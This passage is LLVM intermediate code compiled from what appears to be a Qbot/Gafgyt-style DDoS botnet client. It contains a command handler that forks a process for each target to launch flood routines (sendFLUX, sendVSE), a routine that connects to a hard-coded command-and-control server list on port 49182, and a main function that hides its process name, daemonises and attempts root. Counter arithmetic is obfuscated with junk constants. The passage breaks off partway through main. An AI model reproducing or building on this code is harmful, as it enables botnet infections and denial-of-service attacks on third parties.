  %498 = load i8**, i8*** %4, align 8
  %499 = getelementptr inbounds i8*, i8** %498, i64 3
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @atoi(i8* %500) #10
  store i32 %501, i32* %32, align 4
  %502 = load i8**, i8*** %4, align 8
  %503 = getelementptr inbounds i8*, i8** %502, i64 4
  %504 = load i8*, i8** %503, align 8
  %505 = call i32 @atoi(i8* %504) #10
  store i32 %505, i32* %33, align 4
  %506 = load i32, i32* %3, align 4
  %507 = icmp eq i32 %506, 7
  br i1 %507, label %508, label %513

; <label>:508:                                    ; preds = %490
  %509 = load i8**, i8*** %4, align 8
  %510 = getelementptr inbounds i8*, i8** %509, i64 6
  %511 = load i8*, i8** %510, align 8
  %512 = call i32 @atoi(i8* %511) #10
  br label %514

; <label>:513:                                    ; preds = %490
  br label %514

; <label>:514:                                    ; preds = %513, %508
  %515 = phi i32 [ %512, %508 ], [ 10, %513 ]
  store i32 %515, i32* %34, align 4
  %516 = load i32, i32* %3, align 4
  %517 = icmp sgt i32 %516, 5
  br i1 %517, label %518, label %523

; <label>:518:                                    ; preds = %514
  %519 = load i8**, i8*** %4, align 8
  %520 = getelementptr inbounds i8*, i8** %519, i64 5
  %521 = load i8*, i8** %520, align 8
  %522 = call i32 @atoi(i8* %521) #10
  br label %524

; <label>:523:                                    ; preds = %514
  br label %524

; <label>:524:                                    ; preds = %523, %518
  %525 = phi i32 [ %522, %518 ], [ 0, %523 ]
  store i32 %525, i32* %35, align 4
  %526 = load i8*, i8** %30, align 8
  %527 = call i8* @strstr(i8* %526, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %528 = icmp ne i8* %527, null
  br i1 %528, label %529, label %548

; <label>:529:                                    ; preds = %524
  %530 = load i8*, i8** %30, align 8
  %531 = call i8* @strtok(i8* %530, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %531, i8** %36, align 8
  br label %532

; <label>:532:                                    ; preds = %545, %529
  %533 = load i8*, i8** %36, align 8
  %534 = icmp ne i8* %533, null
  br i1 %534, label %535, label %547

; <label>:535:                                    ; preds = %532
  %536 = call i32 @listFork()
  %537 = icmp ne i32 %536, 0
  br i1 %537, label %545, label %538

; <label>:538:                                    ; preds = %535
  %539 = load i8*, i8** %36, align 8
  %540 = load i32, i32* %31, align 4
  %541 = load i32, i32* %32, align 4
  %542 = load i32, i32* %33, align 4
  %543 = load i32, i32* %35, align 4
  %544 = load i32, i32* %34, align 4
  call void @sendFLUX(i8* %539, i32 %540, i32 %541, i32 %542, i32 %543, i32 %544)
  call void @_exit(i32 0) #12
  unreachable

; <label>:545:                                    ; preds = %535
  %546 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %546, i8** %36, align 8
  br label %532

; <label>:547:                                    ; preds = %532
  br label %559

; <label>:548:                                    ; preds = %524
  %549 = call i32 @listFork()
  %550 = icmp ne i32 %549, 0
  br i1 %550, label %551, label %552

; <label>:551:                                    ; preds = %548
  br label %757

; <label>:552:                                    ; preds = %548
  %553 = load i8*, i8** %30, align 8
  %554 = load i32, i32* %31, align 4
  %555 = load i32, i32* %32, align 4
  %556 = load i32, i32* %33, align 4
  %557 = load i32, i32* %35, align 4
  %558 = load i32, i32* %34, align 4
  call void @sendFLUX(i8* %553, i32 %554, i32 %555, i32 %556, i32 %557, i32 %558)
  call void @_exit(i32 0) #12
  unreachable

; <label>:559:                                    ; preds = %547
  br label %560

; <label>:560:                                    ; preds = %559, %480
  %561 = load i8**, i8*** %4, align 8
  %562 = getelementptr inbounds i8*, i8** %561, i64 0
  %563 = load i8*, i8** %562, align 8
  %564 = call i32 @strcmp(i8* %563, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i32 0, i32 0)) #10
  %565 = icmp ne i32 %564, 0
  br i1 %565, label %709, label %566

; <label>:566:                                    ; preds = %560
  %567 = load i32, i32* %3, align 4
  %568 = icmp slt i32 %567, 6
  br i1 %568, label %620, label %569

; <label>:569:                                    ; preds = %566
  %570 = load i8**, i8*** %4, align 8
  %571 = getelementptr inbounds i8*, i8** %570, i64 3
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @atoi(i8* %572) #10
  %574 = icmp eq i32 %573, -1
  br i1 %574, label %620, label %575

; <label>:575:                                    ; preds = %569
  %576 = load i8**, i8*** %4, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 2
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @atoi(i8* %578) #10
  %580 = icmp eq i32 %579, -1
  br i1 %580, label %620, label %581

; <label>:581:                                    ; preds = %575
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 4
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  %586 = icmp eq i32 %585, -1
  br i1 %586, label %620, label %587

; <label>:587:                                    ; preds = %581
  %588 = load i8**, i8*** %4, align 8
  %589 = getelementptr inbounds i8*, i8** %588, i64 5
  %590 = load i8*, i8** %589, align 8
  %591 = call i32 @atoi(i8* %590) #10
  %592 = icmp eq i32 %591, -1
  br i1 %592, label %620, label %593

; <label>:593:                                    ; preds = %587
  %594 = load i8**, i8*** %4, align 8
  %595 = getelementptr inbounds i8*, i8** %594, i64 5
  %596 = load i8*, i8** %595, align 8
  %597 = call i32 @atoi(i8* %596) #10
  %598 = icmp sgt i32 %597, 65536
  br i1 %598, label %620, label %599

; <label>:599:                                    ; preds = %593
  %600 = load i8**, i8*** %4, align 8
  %601 = getelementptr inbounds i8*, i8** %600, i64 5
  %602 = load i8*, i8** %601, align 8
  %603 = call i32 @atoi(i8* %602) #10
  %604 = icmp sgt i32 %603, 65500
  br i1 %604, label %620, label %605

; <label>:605:                                    ; preds = %599
  %606 = load i8**, i8*** %4, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 4
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #10
  %610 = icmp sgt i32 %609, 32
  br i1 %610, label %620, label %611

; <label>:611:                                    ; preds = %605
  %612 = load i32, i32* %3, align 4
  %613 = icmp eq i32 %612, 7
  br i1 %613, label %614, label %621

; <label>:614:                                    ; preds = %611
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 6
  %617 = load i8*, i8** %616, align 8
  %618 = call i32 @atoi(i8* %617) #10
  %619 = icmp slt i32 %618, 1
  br i1 %619, label %620, label %621

; <label>:620:                                    ; preds = %614, %605, %599, %593, %587, %581, %575, %569, %566
  br label %757

; <label>:621:                                    ; preds = %614, %611
  %622 = load i8**, i8*** %4, align 8
  %623 = getelementptr inbounds i8*, i8** %622, i64 1
  %624 = load i8*, i8** %623, align 8
  store i8* %624, i8** %37, align 8
  %625 = load i8**, i8*** %4, align 8
  %626 = getelementptr inbounds i8*, i8** %625, i64 2
  %627 = load i8*, i8** %626, align 8
  %628 = call i32 @atoi(i8* %627) #10
  store i32 %628, i32* %38, align 4
  %629 = load i8**, i8*** %4, align 8
  %630 = getelementptr inbounds i8*, i8** %629, i64 3
  %631 = load i8*, i8** %630, align 8
  %632 = call i32 @atoi(i8* %631) #10
  store i32 %632, i32* %39, align 4
  %633 = load i8**, i8*** %4, align 8
  %634 = getelementptr inbounds i8*, i8** %633, i64 4
  %635 = load i8*, i8** %634, align 8
  %636 = call i32 @atoi(i8* %635) #10
  store i32 %636, i32* %40, align 4
  %637 = load i8**, i8*** %4, align 8
  %638 = getelementptr inbounds i8*, i8** %637, i64 5
  %639 = load i8*, i8** %638, align 8
  %640 = call i32 @atoi(i8* %639) #10
  store i32 %640, i32* %41, align 4
  %641 = load i32, i32* %3, align 4
  %642 = icmp sgt i32 %641, 6
  br i1 %642, label %643, label %648

; <label>:643:                                    ; preds = %621
  %644 = load i8**, i8*** %4, align 8
  %645 = getelementptr inbounds i8*, i8** %644, i64 6
  %646 = load i8*, i8** %645, align 8
  %647 = call i32 @atoi(i8* %646) #10
  br label %649

; <label>:648:                                    ; preds = %621
  br label %649

; <label>:649:                                    ; preds = %648, %643
  %650 = phi i32 [ %647, %643 ], [ 1000, %648 ]
  store i32 %650, i32* %42, align 4
  %651 = load i32, i32* %3, align 4
  %652 = icmp sgt i32 %651, 7
  br i1 %652, label %653, label %658

; <label>:653:                                    ; preds = %649
  %654 = load i8**, i8*** %4, align 8
  %655 = getelementptr inbounds i8*, i8** %654, i64 7
  %656 = load i8*, i8** %655, align 8
  %657 = call i32 @atoi(i8* %656) #10
  br label %659

; <label>:658:                                    ; preds = %649
  br label %659

; <label>:659:                                    ; preds = %658, %653
  %660 = phi i32 [ %657, %653 ], [ 1000000, %658 ]
  store i32 %660, i32* %43, align 4
  %661 = load i32, i32* %3, align 4
  %662 = icmp sgt i32 %661, 8
  br i1 %662, label %663, label %668

; <label>:663:                                    ; preds = %659
  %664 = load i8**, i8*** %4, align 8
  %665 = getelementptr inbounds i8*, i8** %664, i64 8
  %666 = load i8*, i8** %665, align 8
  %667 = call i32 @atoi(i8* %666) #10
  br label %669

; <label>:668:                                    ; preds = %659
  br label %669

; <label>:669:                                    ; preds = %668, %663
  %670 = phi i32 [ %667, %663 ], [ 0, %668 ]
  store i32 %670, i32* %44, align 4
  %671 = load i8*, i8** %37, align 8
  %672 = call i8* @strstr(i8* %671, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %673 = icmp ne i8* %672, null
  br i1 %673, label %674, label %695

; <label>:674:                                    ; preds = %669
  %675 = load i8*, i8** %37, align 8
  %676 = call i8* @strtok(i8* %675, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %676, i8** %45, align 8
  br label %677

; <label>:677:                                    ; preds = %692, %674
  %678 = load i8*, i8** %45, align 8
  %679 = icmp ne i8* %678, null
  br i1 %679, label %680, label %694

; <label>:680:                                    ; preds = %677
  %681 = call i32 @listFork()
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %692, label %683

; <label>:683:                                    ; preds = %680
  %684 = load i8*, i8** %45, align 8
  %685 = load i32, i32* %38, align 4
  %686 = load i32, i32* %39, align 4
  %687 = load i32, i32* %40, align 4
  %688 = load i32, i32* %41, align 4
  %689 = load i32, i32* %42, align 4
  %690 = load i32, i32* %43, align 4
  %691 = load i32, i32* %44, align 4
  call void @sendVSE(i8* %684, i32 %685, i32 %686, i32 %687, i32 %688, i32 %689, i32 %690, i32 %691)
  call void @_exit(i32 0) #12
  unreachable

; <label>:692:                                    ; preds = %680
  %693 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %693, i8** %45, align 8
  br label %677

; <label>:694:                                    ; preds = %677
  br label %708

; <label>:695:                                    ; preds = %669
  %696 = call i32 @listFork()
  %697 = icmp ne i32 %696, 0
  br i1 %697, label %707, label %698

; <label>:698:                                    ; preds = %695
  %699 = load i8*, i8** %37, align 8
  %700 = load i32, i32* %38, align 4
  %701 = load i32, i32* %39, align 4
  %702 = load i32, i32* %40, align 4
  %703 = load i32, i32* %41, align 4
  %704 = load i32, i32* %42, align 4
  %705 = load i32, i32* %43, align 4
  %706 = load i32, i32* %44, align 4
  call void @sendVSE(i8* %699, i32 %700, i32 %701, i32 %702, i32 %703, i32 %704, i32 %705, i32 %706)
  call void @_exit(i32 0) #12
  unreachable

; <label>:707:                                    ; preds = %695
  br label %708

; <label>:708:                                    ; preds = %707, %694
  br label %757

; <label>:709:                                    ; preds = %560
  %710 = load i8**, i8*** %4, align 8
  %711 = getelementptr inbounds i8*, i8** %710, i64 0
  %712 = load i8*, i8** %711, align 8
  %713 = call i32 @strcmp(i8* %712, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.108, i32 0, i32 0)) #10
  %714 = icmp ne i32 %713, 0
  br i1 %714, label %757, label %715

; <label>:715:                                    ; preds = %709
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  br label %716

; <label>:716:                                    ; preds = %745, %715
  %717 = load i64, i64* %47, align 8
  %718 = load i64, i64* @numpids, align 8
  %719 = icmp ult i64 %717, %718
  br i1 %719, label %720, label %751

; <label>:720:                                    ; preds = %716
  %721 = load i32*, i32** @pids, align 8
  %722 = load i64, i64* %47, align 8
  %723 = getelementptr inbounds i32, i32* %721, i64 %722
  %724 = load i32, i32* %723, align 4
  %725 = icmp ne i32 %724, 0
  br i1 %725, label %726, label %744

; <label>:726:                                    ; preds = %720
  %727 = load i32*, i32** @pids, align 8
  %728 = load i64, i64* %47, align 8
  %729 = getelementptr inbounds i32, i32* %727, i64 %728
  %730 = load i32, i32* %729, align 4
  %731 = call i32 @getpid() #2
  %732 = icmp ne i32 %730, %731
  br i1 %732, label %733, label %744

; <label>:733:                                    ; preds = %726
  %734 = load i32*, i32** @pids, align 8
  %735 = load i64, i64* %47, align 8
  %736 = getelementptr inbounds i32, i32* %734, i64 %735
  %737 = load i32, i32* %736, align 4
  %738 = call i32 @kill(i32 %737, i32 9) #2
  %739 = load i32, i32* %46, align 4
  %740 = add i32 %739, -910832927
  %741 = add i32 %740, 1
  %742 = sub i32 %741, -910832927
  %743 = add nsw i32 %739, 1
  store i32 %742, i32* %46, align 4
  br label %744

; <label>:744:                                    ; preds = %733, %726, %720
  br label %745

; <label>:745:                                    ; preds = %744
  %746 = load i64, i64* %47, align 8
  %747 = add i64 %746, 5818000049128696087
  %748 = add i64 %747, 1
  %749 = sub i64 %748, 5818000049128696087
  %750 = add i64 %746, 1
  store i64 %749, i64* %47, align 8
  br label %716

; <label>:751:                                    ; preds = %716
  %752 = load i32, i32* %46, align 4
  %753 = icmp sgt i32 %752, 0
  br i1 %753, label %754, label %755

; <label>:754:                                    ; preds = %751
  br label %756

; <label>:755:                                    ; preds = %751
  br label %756

; <label>:756:                                    ; preds = %755, %754
  br label %757

; <label>:757:                                    ; preds = %756, %709, %708, %620, %551, %489, %479, %447, %402, %398, %376, %344, %322, %247, %195, %107
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  %15 = sext i32 %13 to i64
  %16 = icmp eq i64 %15, 1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %24

; <label>:18:                                     ; preds = %10
  %19 = load i32, i32* @currentServer, align 4
  %20 = sub i32 %19, 2033920747
  %21 = add i32 %20, 1
  %22 = add i32 %21, 2033920747
  %23 = add nsw i32 %19, 1
  store i32 %22, i32* @currentServer, align 4
  br label %24

; <label>:24:                                     ; preds = %18, %17
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %26 = load i32, i32* @currentServer, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1 x i8*], [1 x i8*]* @OreoServer, i64 0, i64 %27
  %29 = load i8*, i8** %28, align 8
  %30 = call i8* @strcpy(i8* %25, i8* %29) #2
  store i32 49182, i32* %3, align 4
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %32 = call i8* @strchr(i8* %31, i32 58) #10
  %33 = icmp ne i8* %32, null
  br i1 %33, label %34, label %41

; <label>:34:                                     ; preds = %24
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %36 = call i8* @strchr(i8* %35, i32 58) #10
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = call i32 @atoi(i8* %37) #10
  store i32 %38, i32* %3, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = call i8* @strchr(i8* %39, i32 58) #10
  store i8 0, i8* %40, align 1
  br label %41

; <label>:41:                                     ; preds = %34, %24
  %42 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %42, i32* @mainCommSock, align 4
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %45 = load i32, i32* %3, align 4
  %46 = call i32 @connectTimeout(i32 %43, i8* %44, i32 %45, i32 30)
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %49, label %48

; <label>:48:                                     ; preds = %41
  store i32 1, i32* %1, align 4
  br label %50

; <label>:49:                                     ; preds = %41
  store i32 0, i32* %1, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48
  %51 = load i32, i32* %1, align 4
  ret i32 %51
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %105

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %105

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %105

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.110, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %102

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.5* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %101

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.6* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, %95
  %97 = sub i32 0, 1
  %98 = add i32 %96, %97
  %99 = sub i32 0, %98
  %100 = add nsw i32 %95, 1
  store i32 %99, i32* %10, align 4
  br label %79

; <label>:101:                                    ; preds = %79
  br label %102

; <label>:102:                                    ; preds = %101, %65
  %103 = load i32, i32* %2, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %102, %36, %29, %15
  %106 = load i32, i32* %1, align 4
  ret i32 %106
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i64 %29) #2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.80, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %37 = call i32 @getpid() #2
  %38 = xor i32 %36, -1
  %39 = and i32 -1253905081, %38
  %40 = xor i32 -1253905081, -1
  %41 = and i32 %36, %40
  %42 = xor i32 %37, -1
  %43 = and i32 %42, -1253905081
  %44 = and i32 %37, %40
  %45 = or i32 %39, %41
  %46 = or i32 %43, %44
  %47 = xor i32 %45, %46
  %48 = xor i32 %36, %37
  call void @srand(i32 %47) #2
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %50 = call i32 @getpid() #2
  %51 = xor i32 %49, -1
  %52 = and i32 %50, %51
  %53 = xor i32 %50, -1
  %54 = and i32 %49, %53
  %55 = or i32 %52, %54
  %56 = xor i32 %49, %50
  call void @init_rand(i32 %55)
  %57 = call i32 @fork() #2
  store i32 %57, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %2
  %60 = load i32, i32* %7, align 4
  %61 = call i32 @waitpid(i32 %60, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %2
  %63 = load i32, i32* %7, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %76, label %65

; <label>:65:                                     ; preds = %62
  %66 = call i32 @fork() #2
  store i32 %66, i32* %8, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %65
  call void @exit(i32 0) #14
  unreachable

; <label>:69:                                     ; preds = %65
  %70 = load i32, i32* %8, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %73, label %72

; <label>:72:                                     ; preds = %69
  br label %74

; <label>:73:                                     ; preds = %69
  br label %74

; <label>:74:                                     ; preds = %73, %72
  br label %75

; <label>:75:                                     ; preds = %74
  br label %77

; <label>:76:                                     ; preds = %62
  br label %77

; <label>:77:                                     ; preds = %76, %75
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0)) #2
  %80 = call i32 @setuid(i32 0) #2
  %81 = call i32 @seteuid(i32 0) #2
  %82 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %83

; <label>:83:                                     ; preds = %89, %78
  %84 = call i32 @fork() #2
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %396

; <label>:86:                                     ; preds = %83
  %87 = call i32 @initConnection()
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %91

; <label>:89:                                     ; preds = %86
  %90 = call i32 @sleep(i32 5)
  br label %83

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %94 = call i8* @inet_ntoa(i32 %93) #2
